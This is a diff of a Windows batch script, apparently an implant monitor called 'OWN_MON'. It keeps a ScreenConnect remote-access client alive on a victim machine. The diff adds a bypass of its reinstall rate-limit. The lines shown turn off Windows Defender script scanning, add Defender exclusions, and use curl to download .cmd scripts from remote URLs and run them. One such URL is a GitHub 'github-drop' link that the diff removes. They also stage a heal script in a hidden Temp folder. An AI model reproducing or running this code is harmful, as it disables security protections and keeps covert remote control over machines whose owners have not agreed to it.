@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M53
+rem  OWN_MON  BUILD 20260804M54
+rem  M54: 1060 always bypasses heal rate-limit; STOPPED+relay start-only (M53).
 rem  M53: STOPPED+relay ImagePath → sc start only (never heal/reinstall); longer start wait; heal only on 1060.
 rem  M52: auto-heal stuck Gryxa (1060+dir / RUNNING no gryxa.com ImagePath) via F8/G7; restore lib if AV ate it.
 rem  M51: force_gryxa.flag queues own_gryxa_force REINSTALL (panel wipe). Daily path stays freeze.
@@ -52,7 +53,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M53"
+set "MONVER=M54"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -651,13 +652,20 @@ exit /b 0
 
 rem ═══════════════ helpers ═══════════════
 :QueueGryxaHeal
-rem %1=REINSTALL|HEAL — rate-limit 90m; launch via wmic breakaway (survives Guest 10s)
+rem %1=REINSTALL|HEAL — rate-limit 90m UNLESS service is 1060 (always allow recover)
 set "HEALMODE=%~1"
 if "%HEALMODE%"=="" set "HEALMODE=HEAL"
-powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\gryxa_heal.flag') -and (((Get-Date)-(Get-Item '%WD%\gryxa_heal.flag').LastWriteTime).TotalMinutes -lt 90)){exit 1}else{exit 0}" >nul 2>&1
-if errorlevel 1 (
-  echo gryxa_heal_rate_limited>>"%LOG%"
-  exit /b 0
+set "BYPASS_RL=0"
+sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+if errorlevel 1 set "BYPASS_RL=1"
+if "!BYPASS_RL!"=="0" (
+  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\gryxa_heal.flag') -and (((Get-Date)-(Get-Item '%WD%\gryxa_heal.flag').LastWriteTime).TotalMinutes -lt 90)){exit 1}else{exit 0}" >nul 2>&1
+  if errorlevel 1 (
+    echo gryxa_heal_rate_limited>>"%LOG%"
+    exit /b 0
+  )
+) else (
+  echo gryxa_heal_bypass_rate_limit_1060>>"%LOG%"
 )
 echo %DATE% %TIME% %HEALMODE%>"%WD%\gryxa_heal.flag"
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
@@ -666,7 +674,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msie
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA%" >nul 2>&1
 if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA2%" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa_force.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_gryxa_force.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
 if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
 if not exist "%SystemRoot%\Temp\.upd" mkdir "%SystemRoot%\Temp\.upd" >nul 2>&1
 > "%SystemRoot%\Temp\.upd\gryxa_heal_once.cmd" (
